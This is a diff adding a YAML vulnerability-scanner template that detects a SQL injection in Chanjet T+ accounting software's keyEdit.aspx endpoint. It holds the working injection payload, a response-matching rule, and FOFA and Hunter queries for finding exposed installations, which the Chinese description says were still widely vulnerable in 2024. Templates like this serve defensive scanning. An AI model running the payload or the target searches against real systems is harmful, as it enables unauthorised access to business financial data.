@@ -1,0 +1,16 @@
+name: CJT-TPlus-sqli     
+rules: 
+  - method: GET   
+    path: /tplus/UFAQD/keyEdit.aspx?KeyID=1%27%20and%201=(select%20sys.fn_varbintohexstr(hashbytes('MD5','123456')))%20--&preload=1
+    headers:
+    body:            
+    expression:                        
+      status_code:               
+      response_header:              
+      response_body: e10adc3949     #sqlserver数据库
+
+detail:                          
+  description: "畅捷通TPlus适用于异地多组织、多机构对企业财务汇总的管理需求；全面支持企业对远程仓库、异地办事处的管理需求；全面满足企业财务业务一体化管理需求。畅捷通TPlus keyEdit.aspx接口存在SQL注入漏洞。截至到2024.5.27仍有相当一部分网站存在该漏洞"
+  search:             
+    fofa: app="畅捷通-TPlus"
+    鹰图: app.name="畅捷通 T+"
